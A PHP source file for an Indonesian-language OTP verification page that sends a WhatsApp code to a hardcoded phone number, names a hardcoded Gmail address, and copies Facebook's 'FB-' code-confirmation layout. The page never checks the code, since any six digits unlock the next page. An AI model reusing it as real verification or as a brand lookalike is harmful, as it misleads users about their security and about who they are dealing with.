<?php
session_start();
if( !isset($_SESSION["login"]) || !isset($_COOKIE["key"]) ){
  header("Location: login.php");
  exit;
}
// ---------------------------------------------------------------------------------------------

require "@functions.php";
kirim_wa_otp("+6285221978481");
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Verifikasi kode OTP</title>
    <link rel="stylesheet" href="assets/css/otp.css" />
    <link rel="icon" type="image/x-icon" href="assets/image/icon.png" />
  </head>
  <body>
    <div class="container">
      <div class="main">
        <h3>Masukkan kode ke email anda</h3>
        <p>Beri tahu kami bahwa email ini milik anda. Masukkan kode dalam email yang dikirim ke <b>indangaming003@gmail.com</b></p>
        <div class="input-text">
          <span>FB-</span>
          <input id="input" type="text" />
        </div>
        <a href="">Kirim email lagi</a>
        <div class="button">
          <a id="lanjutkan" class="none" href="#">Lanjutkan</a>
        </div>
      </div>
    </div>
    <script>
      const input = document.getElementById("input");
      const lanjutkan = document.getElementById("lanjutkan");
      input.addEventListener("input", () => {
        if (isNaN(input.value)) {
          input.value = "";
        } else {
          if (input.value.length === 6) {
            lanjutkan.classList.replace("none", "active");
            lanjutkan.href = "page_lanjutan.php";
          } else if (input.value.length > 6) {
            input.value = input.value.slice(0, -1);
          } else {
            lanjutkan.classList.replace("active", "none");
            lanjutkan.href = "#";
          }
        }
      });
    </script>
  </body>
</html>
